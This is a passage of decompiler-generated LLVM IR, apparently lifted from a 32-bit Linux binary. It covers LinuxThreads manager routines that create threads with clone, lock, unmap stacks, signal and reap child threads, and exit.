  %v3_804be11 = load i32, i32* %v2_804be11, align 4
  %v4_804be11 = icmp eq i32 %v3_804be11, 0
  br i1 %v4_804be11, label %dec_label_pc_804be84, label %dec_label_pc_804be18

dec_label_pc_804be18:                             ; preds = %dec_label_pc_804bdc1
  %v1_804be18 = add i32 %v0_804be11, 4
  %v2_804be18 = inttoptr i32 %v1_804be18 to i32*
  %v3_804be18 = load i32, i32* %v2_804be18, align 4
  store i32 %v3_804be18, i32* %ecx.global-to-local, align 4
  %v0_804be1c = load i32, i32* @global_var_80679f4.148, align 4
  store i32 %v0_804be1c, i32* %eax.global-to-local, align 4
  %v1_804be21 = add i32 %v3_804be18, 416
  %v2_804be21 = inttoptr i32 %v1_804be21 to i8*
  %v3_804be21 = load i8, i8* %v2_804be21, align 1
  %v4_804be21 = zext i8 %v3_804be21 to i32
  %v5_804be21 = load i32, i32* @edx, align 4
  %v6_804be21 = and i32 %v5_804be21, -256
  %v7_804be21 = or i32 %v4_804be21, %v0_804be1c
  %v3_804be27 = trunc i32 %v7_804be21 to i8
  %v5_804be27 = icmp slt i8 %v3_804be27, 0
  %v9_804be27 = urem i32 %v7_804be21, 256
  %v12_804be27 = or i32 %v9_804be27, %v6_804be21
  store i32 %v12_804be27, i32* %edx.global-to-local, align 4
  %v1_804be29 = icmp eq i1 %v5_804be27, false
  br i1 %v1_804be29, label %dec_label_pc_804be84, label %dec_label_pc_804be2b

dec_label_pc_804be2b:                             ; preds = %dec_label_pc_804be18
  %v0_804be2b = load i32, i32* @ebx, align 4
  %v1_804be2b = add i32 %v0_804be2b, 28
  %v2_804be2b = inttoptr i32 %v1_804be2b to i32*
  %v3_804be2b = load i32, i32* %v2_804be2b, align 4
  store i32 %v3_804be2b, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_804be30 = call i32 @__pthread_lock(i32 %arg1)
  %v0_804be35 = load i32, i32* @global_var_8062a8c.154, align 4
  store i32 %v0_804be35, i32* %eax.global-to-local, align 4
  %v0_804be3a = load i32, i32* @ebx, align 4
  %v1_804be3a = load i32, i32* @esp, align 4
  %v2_804be3a = add i32 %v1_804be3a, -4
  %v3_804be3a = inttoptr i32 %v2_804be3a to i32*
  store i32 %v0_804be3a, i32* %v3_804be3a, align 4
  %v0_804be3b = load i32, i32* %eax.global-to-local, align 4
  %v1_804be3b = udiv i32 %v0_804be3b, 256
  %v3_804be3b = and i32 %v1_804be3b, 240
  %v8_804be3b = or i32 %v3_804be3b, 15
  %v10_804be3b = mul nuw nsw i32 %v8_804be3b, 256
  %v11_804be3b = and i32 %v0_804be3b, -65281
  %v12_804be3b = or i32 %v10_804be3b, %v11_804be3b
  store i32 %v12_804be3b, i32* %eax.global-to-local, align 4
  %v2_804be3e = add i32 %v1_804be3a, -8
  %v3_804be3e = inttoptr i32 %v2_804be3e to i32*
  store i32 %v12_804be3b, i32* %v3_804be3e, align 4
  %v0_804be3f = load i32, i32* @ebx, align 4
  %v2_804be3f = add i32 %v1_804be3a, -12
  %v3_804be3f = inttoptr i32 %v2_804be3f to i32*
  store i32 %v0_804be3f, i32* %v3_804be3f, align 4
  %v1_804be40 = add i32 %v1_804be3a, -16
  %v2_804be40 = inttoptr i32 %v1_804be40 to i32*
  store i32 134526997, i32* %v2_804be40, align 4
  %v2_804be45 = load i32, i32* %stack_var_-16, align 4
  %v5_804be45 = call i32 @clone(i32 %arg1, i32 1, i32 %v2_804be45, i32 %v0_804ba07)
  store i32 %v5_804be45, i32* @eax, align 4
  %v0_804be4a = load i32, i32* @esp, align 4
  %v10_804be4d = icmp eq i32 %v5_804be45, -1
  store i32 %v5_804be45, i32* @esi, align 4
  br i1 %v10_804be4d, label %dec_label_pc_804be80, label %dec_label_pc_804be54

dec_label_pc_804be54:                             ; preds = %dec_label_pc_804be2b
  %v0_804be54 = load i32, i32* @ebx, align 4
  %v2_804be54 = add i32 %v0_804be54, 428
  %v3_804be54 = inttoptr i32 %v2_804be54 to i32*
  store i32 %v0_804be54, i32* %v3_804be54, align 4
  %v0_804be5a = load i32, i32* @ebx, align 4
  %v1_804be5a = add i32 %v0_804be5a, 424
  %v2_804be5a = inttoptr i32 %v1_804be5a to i32*
  store i32 8, i32* %v2_804be5a, align 4
  %v0_804be64 = load i32, i32* @ebx, align 4
  store i32 %v0_804be64, i32* @global_var_80679fc.149, align 4
  %v2_804be6a = add i32 %v0_804be64, 20
  %v3_804be6a = inttoptr i32 %v2_804be6a to i32*
  store i32 %v5_804be45, i32* %v3_804be6a, align 4
  %v0_804be6d = call i32 @__linuxthreads_create_event()
  store i32 %v0_804be6d, i32* %eax.global-to-local, align 4
  %v0_804be72 = load i32, i32* @esp, align 4
  %v0_804be75 = load i32, i32* @ebx, align 4
  %v1_804be75 = add i32 %v0_804be75, 28
  %v2_804be75 = inttoptr i32 %v1_804be75 to i32*
  %v3_804be75 = load i32, i32* %v2_804be75, align 4
  %v5_804be75 = add i32 %v0_804be72, -16
  %v6_804be75 = inttoptr i32 %v5_804be75 to i32*
  store i32 %v3_804be75, i32* %v6_804be75, align 4
  %v2_804be78 = call i32 @__pthread_unlock(i32* %v1_804bf97)
  store i32 %v2_804be78, i32* %eax.global-to-local, align 4
  %v0_804be7d = load i32, i32* @esp, align 4
  %v0_804be80.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804be80

dec_label_pc_804be80:                             ; preds = %dec_label_pc_804be2b, %dec_label_pc_804be54
  %v1_804be8925.in = phi i32 [ %v0_804be4a, %dec_label_pc_804be2b ], [ %v0_804be7d, %dec_label_pc_804be54 ]
  %v0_804be80 = phi i32 [ %v5_804be45, %dec_label_pc_804be2b ], [ %v0_804be80.pre, %dec_label_pc_804be54 ]
  %v1_804be8925 = add i32 %v1_804be8925.in, 16
  %v1_804be80 = icmp eq i32 %v0_804be80, 0
  %v1_804be82 = icmp eq i1 %v1_804be80, false
  br i1 %v1_804be82, label %dec_label_pc_804be9e, label %dec_label_pc_804be84

dec_label_pc_804be84:                             ; preds = %dec_label_pc_804be80, %dec_label_pc_804be18, %dec_label_pc_804bdc1
  %v1_804be89 = phi i32 [ %v1_804be8925, %dec_label_pc_804be80 ], [ %v0_804be11, %dec_label_pc_804be18 ], [ %v0_804be11, %dec_label_pc_804bdc1 ]
  %v0_804be84 = load i32, i32* @global_var_8062a8c.154, align 4
  store i32 %v0_804be84, i32* %eax.global-to-local, align 4
  %v0_804be89 = load i32, i32* @ebx, align 4
  %v2_804be89 = add i32 %v1_804be89, -4
  %v3_804be89 = inttoptr i32 %v2_804be89 to i32*
  store i32 %v0_804be89, i32* %v3_804be89, align 4
  %v0_804be8a = load i32, i32* %eax.global-to-local, align 4
  %v1_804be8a = udiv i32 %v0_804be8a, 256
  %v3_804be8a = and i32 %v1_804be8a, 240
  %v8_804be8a = or i32 %v3_804be8a, 15
  %v10_804be8a = mul nuw nsw i32 %v8_804be8a, 256
  %v11_804be8a = and i32 %v0_804be8a, -65281
  %v12_804be8a = or i32 %v10_804be8a, %v11_804be8a
  store i32 %v12_804be8a, i32* %eax.global-to-local, align 4
  %v2_804be8d = add i32 %v1_804be89, -8
  %v3_804be8d = inttoptr i32 %v2_804be8d to i32*
  store i32 %v12_804be8a, i32* %v3_804be8d, align 4
  %v0_804be8e = load i32, i32* @ebx, align 4
  %v2_804be8e = add i32 %v1_804be89, -12
  %v3_804be8e = inttoptr i32 %v2_804be8e to i32*
  store i32 %v0_804be8e, i32* %v3_804be8e, align 4
  %v1_804be8f = add i32 %v1_804be89, -16
  %v2_804be8f = inttoptr i32 %v1_804be8f to i32*
  store i32 134526790, i32* %v2_804be8f, align 4
  %v2_804be94 = load i32, i32* %stack_var_-16, align 4
  %v5_804be94 = call i32 @clone(i32 %arg1, i32 1, i32 %v2_804be94, i32 %v0_804ba07)
  store i32 %v5_804be94, i32* %eax.global-to-local, align 4
  store i32 %v5_804be94, i32* @esi, align 4
  br label %dec_label_pc_804be9e

dec_label_pc_804be9e:                             ; preds = %dec_label_pc_804be80, %dec_label_pc_804be84
  %v0_804bf2b = phi i32 [ %v0_804be80, %dec_label_pc_804be80 ], [ %v5_804be94, %dec_label_pc_804be84 ]
  %v10_804be9e = icmp eq i32 %v0_804bf2b, -1
  %v1_804bea1 = icmp eq i1 %v10_804be9e, false
  %v1_804bf2b = load i32, i32* @ebx, align 4
  br i1 %v1_804bea1, label %dec_label_pc_804bf2b, label %dec_label_pc_804bea7

dec_label_pc_804bea7:                             ; preds = %dec_label_pc_804be9e
  %v1_804bea7 = inttoptr i32 %v1_804bf2b to i32*
  %v2_804bea7 = load i32, i32* %v1_804bea7, align 4
  store i32 %v2_804bea7, i32* %eax.global-to-local, align 4
  %v0_804bea9 = load i32, i32* @edi, align 4
  %v1_804bea9 = icmp eq i32 %v0_804bea9, 0
  %v1_804beab = add i32 %v1_804bf2b, 4
  %v2_804beab = inttoptr i32 %v1_804beab to i32*
  %v3_804beab = load i32, i32* %v2_804beab, align 4
  store i32 %v3_804beab, i32* %edx.global-to-local, align 4
  %v2_804beae = add i32 %v2_804bea7, 4
  %v3_804beae = inttoptr i32 %v2_804beae to i32*
  store i32 %v3_804beab, i32* %v3_804beae, align 4
  %v0_804beb1 = load i32, i32* @ebx, align 4
  %v1_804beb1 = add i32 %v0_804beb1, 4
  %v2_804beb1 = inttoptr i32 %v1_804beb1 to i32*
  %v3_804beb1 = load i32, i32* %v2_804beb1, align 4
  store i32 %v3_804beb1, i32* @edx, align 4
  %v0_804beb4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804beb4 = inttoptr i32 %v3_804beb1 to i32*
  store i32 %v0_804beb4, i32* %v2_804beb4, align 4
  br i1 %v1_804bea9, label %dec_label_pc_804bebe, label %dec_label_pc_804beb8

dec_label_pc_804beb8:                             ; preds = %dec_label_pc_804bea7
  %v0_804beb8 = load i32, i32* @edi, align 4
  %v1_804beb8 = add i32 %v0_804beb8, 24
  %v2_804beb8 = inttoptr i32 %v1_804beb8 to i32*
  %v3_804beb8 = load i32, i32* %v2_804beb8, align 4
  %v4_804beb8 = icmp eq i32 %v3_804beb8, 0
  %v1_804bebc = icmp eq i1 %v4_804beb8, false
  br i1 %v1_804bebc, label %dec_label_pc_804beb8.dec_label_pc_804bef5_crit_edge, label %dec_label_pc_804bebe

dec_label_pc_804beb8.dec_label_pc_804bef5_crit_edge: ; preds = %dec_label_pc_804beb8
  %v0_804bef5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bef5

dec_label_pc_804bebe:                             ; preds = %dec_label_pc_804beb8, %dec_label_pc_804bea7
  %v0_804bebe = load i32, i32* @ebx, align 4
  %v1_804bebe = add i32 %v0_804bebe, 400
  %v2_804bebe = inttoptr i32 %v1_804bebe to i32*
  %v3_804bebe = load i32, i32* %v2_804bebe, align 4
  store i32 %v3_804bebe, i32* %eax.global-to-local, align 4
  %v1_804bec4 = icmp eq i32 %v3_804bebe, 0
  br i1 %v1_804bec4, label %dec_label_pc_804bebe.dec_label_pc_804bed9_crit_edge, label %dec_label_pc_804bec8

dec_label_pc_804bebe.dec_label_pc_804bed9_crit_edge: ; preds = %dec_label_pc_804bebe
  %v1_804bede.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bed9

dec_label_pc_804bec8:                             ; preds = %dec_label_pc_804bebe
  %v0_804bec8 = load i32, i32* @ecx, align 4
  %v1_804bec8 = load i32, i32* @esp, align 4
  %v2_804bec8 = add i32 %v1_804bec8, -4
  %v3_804bec8 = inttoptr i32 %v2_804bec8 to i32*
  store i32 %v0_804bec8, i32* %v3_804bec8, align 4
  %v0_804bec9 = load i32, i32* @ecx, align 4
  %v2_804bec9 = add i32 %v1_804bec8, -8
  %v3_804bec9 = inttoptr i32 %v2_804bec9 to i32*
  store i32 %v0_804bec9, i32* %v3_804bec9, align 4
  %v2_804beca = add i32 %v1_804bec8, -12
  %v3_804beca = inttoptr i32 %v2_804beca to i32*
  store i32 %v3_804bebe, i32* %v3_804beca, align 4
  %v0_804becb = load i32, i32* @ebx, align 4
  %v1_804becb = add i32 %v0_804becb, 396
  %v2_804becb = inttoptr i32 %v1_804becb to i32*
  %v3_804becb = load i32, i32* %v2_804becb, align 4
  %v5_804becb = add i32 %v1_804bec8, -16
  %v6_804becb = inttoptr i32 %v5_804becb to i32*
  store i32 %v3_804becb, i32* %v6_804becb, align 4
  %v2_804bed1 = load i32, i32* %stack_var_-16, align 4
  %v5_804bed1 = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_804bed1, i32 %v0_804ba07)
  store i32 %v5_804bed1, i32* %eax.global-to-local, align 4
  %v0_804bed6 = load i32, i32* @esp, align 4
  %v1_804bed6 = add i32 %v0_804bed6, 16
  br label %dec_label_pc_804bed9

dec_label_pc_804bed9:                             ; preds = %dec_label_pc_804bebe.dec_label_pc_804bed9_crit_edge, %dec_label_pc_804bec8
  %v1_804bede = phi i32 [ %v1_804bede.pre, %dec_label_pc_804bebe.dec_label_pc_804bed9_crit_edge ], [ %v1_804bed6, %dec_label_pc_804bec8 ]
  %v0_804bed9 = load i32, i32* @global_var_8067654.156, align 4
  store i32 %v0_804bed9, i32* %eax.global-to-local, align 4
  %v0_804bede = load i32, i32* @edx, align 4
  %v2_804bede = add i32 %v1_804bede, -4
  %v3_804bede = inttoptr i32 %v2_804bede to i32*
  store i32 %v0_804bede, i32* %v3_804bede, align 4
  %v0_804bedf = load i32, i32* @edx, align 4
  %v2_804bedf = add i32 %v1_804bede, -8
  %v3_804bedf = inttoptr i32 %v2_804bedf to i32*
  store i32 %v0_804bedf, i32* %v3_804bedf, align 4
  %v0_804bee0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bee0 = mul i32 %v0_804bee0, 4
  %v0_804bee3 = load i32, i32* @ebx, align 4
  %v2_804bee3 = sub i32 %v0_804bee3, %v2_804bee0
  store i32 %v2_804bee3, i32* @ebx, align 4
  %v2_804bee5 = add i32 %v1_804bede, -12
  %v3_804bee5 = inttoptr i32 %v2_804bee5 to i32*
  store i32 %v2_804bee0, i32* %v3_804bee5, align 4
  %v0_804bee6 = load i32, i32* @ebx, align 4
  %v1_804bee6 = add i32 %v0_804bee6, 480
  store i32 %v1_804bee6, i32* %eax.global-to-local, align 4
  %v2_804beec = add i32 %v1_804bede, -16
  %v3_804beec = inttoptr i32 %v2_804beec to i32*
  store i32 %v1_804bee6, i32* %v3_804beec, align 4
  %v2_804beed = load i32, i32* %stack_var_-16, align 4
  %v5_804beed = call i32 @munmap(i32 %arg1, i32 1, i32 %v2_804beed, i32 %v0_804ba07)
  store i32 %v5_804beed, i32* %eax.global-to-local, align 4
  %v0_804bef2 = load i32, i32* @esp, align 4
  %v1_804bef2 = add i32 %v0_804bef2, 16
  br label %dec_label_pc_804bef5

dec_label_pc_804bef5:                             ; preds = %dec_label_pc_804beb8.dec_label_pc_804bef5_crit_edge, %dec_label_pc_804bed9
  %v0_804bef5 = phi i32 [ %v0_804bef5.pre, %dec_label_pc_804beb8.dec_label_pc_804bef5_crit_edge ], [ %v1_804bef2, %dec_label_pc_804bed9 ]
  %v1_804bef5 = add i32 %v0_804bef5, 20
  %v2_804bef5 = inttoptr i32 %v1_804bef5 to i32*
  %v3_804bef5 = load i32, i32* %v2_804bef5, align 4
  %v2_804bef9 = mul i32 %v3_804bef5, 16
  store i32 %v2_804bef9, i32* %eax.global-to-local, align 4
  %v1_804befc = add i32 %v2_804bef9, 134604456
  %v2_804befc = inttoptr i32 %v1_804befc to i32*
  store i32 0, i32* %v2_804befc, align 8
  %v0_804bf06 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf06 = add i32 %v0_804bf06, 134604460
  %v2_804bf06 = inttoptr i32 %v1_804bf06 to i32*
  store i32 0, i32* %v2_804bf06, align 4
  %v0_804bf10 = load i32, i32* @global_var_80626a0.147, align 32
  %v1_804bf15 = add i32 %v0_804bf10, -1
  store i32 %v1_804bf15, i32* %eax.global-to-local, align 4
  store i32 %v1_804bf15, i32* @global_var_80626a0.147, align 32
  %v1_804bf1b = call i32 @__errno_location(i32 %arg1)
  store i32 %v1_804bf1b, i32* %eax.global-to-local, align 4
  %v1_804bf20 = inttoptr i32 %v1_804bf1b to i32*
  %v2_804bf20 = load i32, i32* %v1_804bf20, align 4
  store i32 %v2_804bf20, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bf3b

dec_label_pc_804bf24:                             ; preds = %dec_label_pc_804bca7, %dec_label_pc_804bb9e
  store i32 11, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bf3b

dec_label_pc_804bf2b:                             ; preds = %dec_label_pc_804be9e
  %v2_804bf2b = add i32 %v1_804bf2b, 20
  %v3_804bf2b = inttoptr i32 %v2_804bf2b to i32*
  store i32 %v0_804bf2b, i32* %v3_804bf2b, align 4
  %v0_804bf2e = load i32, i32* @esp, align 4
  %v1_804bf2e = add i32 %v0_804bf2e, 16
  %v2_804bf2e = inttoptr i32 %v1_804bf2e to i32*
  %v3_804bf2e = load i32, i32* %v2_804bf2e, align 4
  store i32 %v3_804bf2e, i32* %edx.global-to-local, align 4
  %v1_804bf32 = add i32 %v0_804bf2e, 4
  %v2_804bf32 = inttoptr i32 %v1_804bf32 to i32*
  %v3_804bf32 = load i32, i32* %v2_804bf32, align 4
  store i32 %v3_804bf32, i32* %eax.global-to-local, align 4
  %v2_804bf36 = add i32 %v3_804bf32, 48
  %v3_804bf36 = inttoptr i32 %v2_804bf36 to i32*
  store i32 %v3_804bf2e, i32* %v3_804bf36, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bf3b

dec_label_pc_804bf3b:                             ; preds = %dec_label_pc_804bb8c, %dec_label_pc_804bf24, %dec_label_pc_804bef5, %dec_label_pc_804bf2b
  %v0_804bf3f = phi i32 [ 1, %dec_label_pc_804bb8c ], [ 11, %dec_label_pc_804bf24 ], [ %v2_804bf20, %dec_label_pc_804bef5 ], [ 0, %dec_label_pc_804bf2b ]
  %v0_804bf3b = load i32, i32* @esp, align 4
  %v1_804bf3b = add i32 %v0_804bf3b, 4
  %v2_804bf3b = inttoptr i32 %v1_804bf3b to i32*
  %v3_804bf3b = load i32, i32* %v2_804bf3b, align 4
  store i32 %v3_804bf3b, i32* %ecx.global-to-local, align 4
  %v2_804bf3f = add i32 %v3_804bf3b, 52
  %v3_804bf3f = inttoptr i32 %v2_804bf3f to i32*
  store i32 %v0_804bf3f, i32* %v3_804bf3f, align 4
  %v0_804bf42 = load i32, i32* @esp, align 4
  %v1_804bf42 = add i32 %v0_804bf42, 48
  %v2_804bf42 = inttoptr i32 %v1_804bf42 to i32*
  %storemerge.pre = load i32, i32* %v2_804bf42, align 4
  br label %dec_label_pc_804c023

dec_label_pc_804bf4b:                             ; preds = %dec_label_pc_804bb22
  %v1_804bf4b = add i32 %v0_804bb39, 72
  %v2_804bf4b = inttoptr i32 %v1_804bf4b to i32*
  %v3_804bf4b = load i32, i32* %v2_804bf4b, align 4
  store i32 %v3_804bf4b, i32* @edi, align 4
  store i32 0, i32* @edx, align 4
  %v1_804bf53 = urem i32 %v3_804bf4b, 1024
  %v2_804bf58 = mul nuw nsw i32 %v1_804bf53, 16
  %v1_804bf5b = add nuw nsw i32 %v2_804bf58, 134604448
  store i32 %v1_804bf5b, i32* @esi, align 4
  store i32 %v1_804bf5b, i32* @eax, align 4
  %v1_804bf63 = call i32 @__pthread_lock(i32 %arg1)
  store i32 %v1_804bf63, i32* %eax.global-to-local, align 4
  %v0_804bf68 = load i32, i32* @esi, align 4
  %v1_804bf68 = add i32 %v0_804bf68, 8
  %v2_804bf68 = inttoptr i32 %v1_804bf68 to i32*
  %v3_804bf68 = load i32, i32* %v2_804bf68, align 4
  store i32 %v3_804bf68, i32* @ebx, align 4
  %v1_804bf6b = icmp eq i32 %v3_804bf68, 0
  br i1 %v1_804bf6b, label %dec_label_pc_804bf93, label %dec_label_pc_804bf6f

dec_label_pc_804bf6f:                             ; preds = %dec_label_pc_804bf4b
  %v1_804bf6f = add i32 %v3_804bf68, 16
  %v2_804bf6f = inttoptr i32 %v1_804bf6f to i32*
  %v3_804bf6f = load i32, i32* %v2_804bf6f, align 4
  %v4_804bf6f = load i32, i32* @edi, align 4
  %v15_804bf6f = icmp eq i32 %v3_804bf6f, %v4_804bf6f
  %v1_804bf72 = icmp eq i1 %v15_804bf6f, false
  br i1 %v1_804bf72, label %dec_label_pc_804bf93, label %dec_label_pc_804bf74

dec_label_pc_804bf74:                             ; preds = %dec_label_pc_804bf6f
  %v1_804bf74 = add i32 %v3_804bf68, 46
  %v2_804bf74 = inttoptr i32 %v1_804bf74 to i8*
  %v3_804bf74 = load i8, i8* %v2_804bf74, align 1
  %v4_804bf74 = icmp eq i8 %v3_804bf74, 0
  br i1 %v4_804bf74, label %dec_label_pc_804bf8f, label %dec_label_pc_804bf7a

dec_label_pc_804bf7a:                             ; preds = %dec_label_pc_804bf74
  %v0_804bf7a = load i32, i32* @esp, align 4
  %v2_804bf7d = add i32 %v0_804bf7a, -16
  %v3_804bf7d = inttoptr i32 %v2_804bf7d to i32*
  store i32 %v0_804bf68, i32* %v3_804bf7d, align 4
  %v2_804bf7e = call i32 @__pthread_unlock(i32* %v1_804bf97)
  %v0_804bf83 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf83, i32* @eax, align 4
  %v0_804bf85 = call i32 @pthread_free()
  store i32 %v0_804bf85, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c05e

dec_label_pc_804bf8f:                             ; preds = %dec_label_pc_804bf74
  %v1_804bf8f = add i32 %v3_804bf68, 45
  %v2_804bf8f = inttoptr i32 %v1_804bf8f to i8*
  store i8 1, i8* %v2_804bf8f, align 1
  %v0_804bf96.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bf93

dec_label_pc_804bf93:                             ; preds = %dec_label_pc_804bf6f, %dec_label_pc_804bf4b, %dec_label_pc_804bf8f
  %v0_804bf96 = phi i32 [ %v0_804bf68, %dec_label_pc_804bf6f ], [ %v0_804bf68, %dec_label_pc_804bf4b ], [ %v0_804bf96.pre, %dec_label_pc_804bf8f ]
  %v0_804bf93 = load i32, i32* @esp, align 4
  %v2_804bf96 = add i32 %v0_804bf93, -16
  %v3_804bf96 = inttoptr i32 %v2_804bf96 to i32*
  store i32 %v0_804bf96, i32* %v3_804bf96, align 4
  %v2_804bf97 = call i32 @__pthread_unlock(i32* %v1_804bf97)
  store i32 %v2_804bf97, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c05e

dec_label_pc_804bfa1:                             ; preds = %dec_label_pc_804bb22
  %v1_804bfa1 = add i32 %v0_804bb39, 72
  %v2_804bfa1 = inttoptr i32 %v1_804bfa1 to i32*
  %v3_804bfa1 = load i32, i32* %v2_804bfa1, align 4
  store i32 %v3_804bfa1, i32* %eax.global-to-local, align 4
  %v1_804bfa5 = add i32 %v0_804bb39, 64
  %v2_804bfa5 = inttoptr i32 %v1_804bfa5 to i32*
  %v3_804bfa5 = load i32, i32* %v2_804bfa5, align 4
  store i32 %v3_804bfa5, i32* @ebx, align 4
  store i32 1, i32* @global_var_8063398.158, align 8
  store i32 %v3_804bfa1, i32* @global_var_806339c.159, align 4
  %v1_804bfb8 = inttoptr i32 %v3_804bfa5 to i32*
  %v2_804bfb8 = load i32, i32* %v1_804bfb8, align 4
  store i32 %v2_804bfb8, i32* @esi, align 4
  %v12_804bfd177 = icmp eq i32 %v2_804bfb8, %v3_804bfa5
  %v1_804bfd379 = icmp eq i1 %v12_804bfd177, false
  br i1 %v1_804bfd379, label %dec_label_pc_804bfbc, label %dec_label_pc_804bfd5

dec_label_pc_804bfbc:                             ; preds = %dec_label_pc_804bfa1, %dec_label_pc_804bfbc
  %v1_804bfbc80 = phi i32 [ %v1_804bfce, %dec_label_pc_804bfbc ], [ %v1_804bb39, %dec_label_pc_804bfa1 ]
  %v0_804bfbc = load i32, i32* @ebp, align 4
  %v2_804bfbc = add i32 %v1_804bfbc80, -4
  %v3_804bfbc = inttoptr i32 %v2_804bfbc to i32*
  store i32 %v0_804bfbc, i32* %v3_804bfbc, align 4
  %v0_804bfbd = load i32, i32* @ebp, align 4
  %v2_804bfbd = add i32 %v1_804bfbc80, -8
  %v3_804bfbd = inttoptr i32 %v2_804bfbd to i32*
  store i32 %v0_804bfbd, i32* %v3_804bfbd, align 4
  %v0_804bfbe = load i32, i32* @global_var_8062a8c.154, align 4
  %v2_804bfbe = add i32 %v1_804bfbc80, -12
  %v3_804bfbe = inttoptr i32 %v2_804bfbe to i32*
  store i32 %v0_804bfbe, i32* %v3_804bfbe, align 4
  %v0_804bfc4 = load i32, i32* @esi, align 4
  %v1_804bfc4 = add i32 %v0_804bfc4, 20
  %v2_804bfc4 = inttoptr i32 %v1_804bfc4 to i32*
  %v3_804bfc4 = load i32, i32* %v2_804bfc4, align 4
  %v5_804bfc4 = add i32 %v1_804bfbc80, -16
  %v6_804bfc4 = inttoptr i32 %v5_804bfc4 to i32*
  store i32 %v3_804bfc4, i32* %v6_804bfc4, align 4
  %v3_804bfc7 = call i32 @kill(i32 %arg1, i32 1)
  store i32 %v3_804bfc7, i32* %eax.global-to-local, align 4
  %v0_804bfcc = load i32, i32* @esi, align 4
  %v1_804bfcc = inttoptr i32 %v0_804bfcc to i32*
  %v2_804bfcc = load i32, i32* %v1_804bfcc, align 4
  store i32 %v2_804bfcc, i32* @esi, align 4
  %v0_804bfce = load i32, i32* @esp, align 4
  %v1_804bfce = add i32 %v0_804bfce, 16
  %v1_804bfd1.pre = load i32, i32* @ebx, align 4
  %v12_804bfd1 = icmp eq i32 %v2_804bfcc, %v1_804bfd1.pre
  %v1_804bfd3 = icmp eq i1 %v12_804bfd1, false
  br i1 %v1_804bfd3, label %dec_label_pc_804bfbc, label %dec_label_pc_804bfd5

dec_label_pc_804bfd5:                             ; preds = %dec_label_pc_804bfbc, %dec_label_pc_804bfa1
  %v1_804bfbc.lcssa = phi i32 [ %v1_804bb39, %dec_label_pc_804bfa1 ], [ %v1_804bfce, %dec_label_pc_804bfbc ]
  %v0_804bfd5.lcssa = phi i32 [ %v2_804bfb8, %dec_label_pc_804bfa1 ], [ %v2_804bfcc, %dec_label_pc_804bfbc ]
  %v1_804bfd5 = inttoptr i32 %v0_804bfd5.lcssa to i32*
  %v2_804bfd5 = load i32, i32* %v1_804bfd5, align 4
  store i32 %v2_804bfd5, i32* @ebx, align 4
  %v12_804bfee67 = icmp eq i32 %v2_804bfd5, %v0_804bfd5.lcssa
  %v1_804bff069 = icmp eq i1 %v12_804bfee67, false
  br i1 %v1_804bff069, label %dec_label_pc_804bfd9, label %dec_label_pc_804bff2

dec_label_pc_804bfd9:                             ; preds = %dec_label_pc_804bfd5, %dec_label_pc_804bfd9
  %v1_804bfd970 = phi i32 [ %v1_804bfeb, %dec_label_pc_804bfd9 ], [ %v1_804bfbc.lcssa, %dec_label_pc_804bfd5 ]
  %v0_804bfd9 = load i32, i32* @edi, align 4
  %v2_804bfd9 = add i32 %v1_804bfd970, -4
  %v3_804bfd9 = inttoptr i32 %v2_804bfd9 to i32*
  store i32 %v0_804bfd9, i32* %v3_804bfd9, align 4
  %v1_804bfda = add i32 %v1_804bfd970, -8
  %v2_804bfda = inttoptr i32 %v1_804bfda to i32*
  store i32 -2147483648, i32* %v2_804bfda, align 4
  %v1_804bfdf = add i32 %v1_804bfd970, -12
  %v2_804bfdf = inttoptr i32 %v1_804bfdf to i32*
  store i32 0, i32* %v2_804bfdf, align 4
  %v0_804bfe1 = load i32, i32* @ebx, align 4
  %v1_804bfe1 = add i32 %v0_804bfe1, 20
  %v2_804bfe1 = inttoptr i32 %v1_804bfe1 to i32*
  %v3_804bfe1 = load i32, i32* %v2_804bfe1, align 4
  %v5_804bfe1 = add i32 %v1_804bfd970, -16
  %v6_804bfe1 = inttoptr i32 %v5_804bfe1 to i32*
  store i32 %v3_804bfe1, i32* %v6_804bfe1, align 4
  %v2_804bfe4 = load i32, i32* %stack_var_-16, align 4
  %v4_804bfe4 = call i32 @waitpid(i32 %arg1, i32 1, i32 %v2_804bfe4)
  store i32 %v4_804bfe4, i32* %eax.global-to-local, align 4
  %v0_804bfe9 = load i32, i32* @ebx, align 4
  %v1_804bfe9 = inttoptr i32 %v0_804bfe9 to i32*
  %v2_804bfe9 = load i32, i32* %v1_804bfe9, align 4
  store i32 %v2_804bfe9, i32* @ebx, align 4
  %v0_804bfeb = load i32, i32* @esp, align 4
  %v1_804bfeb = add i32 %v0_804bfeb, 16
  %v1_804bfee.pre = load i32, i32* @esi, align 4
  %v12_804bfee = icmp eq i32 %v2_804bfe9, %v1_804bfee.pre
  %v1_804bff0 = icmp eq i1 %v12_804bfee, false
  br i1 %v1_804bff0, label %dec_label_pc_804bfd9, label %dec_label_pc_804bff2

dec_label_pc_804bff2:                             ; preds = %dec_label_pc_804bfd9, %dec_label_pc_804bfd5
  %v0_804bff2.lcssa = phi i32 [ %v2_804bfd5, %dec_label_pc_804bfd5 ], [ %v2_804bfe9, %dec_label_pc_804bfd9 ]
  store i32 %v0_804bff2.lcssa, i32* @eax, align 4
  %v0_804bff4 = call i32 @restart()
  br label %dec_label_pc_804bff9

dec_label_pc_804bff9:                             ; preds = %dec_label_pc_804baef, %dec_label_pc_804bff2
  %storemerge1 = phi i32 [ %v0_804bff4, %dec_label_pc_804bff2 ], [ %v0_804baf3, %dec_label_pc_804baef ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  %v0_804bff9 = load i32, i32* @esp, align 4
  %v1_804bffc = add i32 %v0_804bff9, -16
  %v2_804bffc = inttoptr i32 %v1_804bffc to i32*
  store i32 0, i32* %v2_804bffc, align 4
  %v1_804bffe = call i32 @__GI__exit(i32 %arg1)
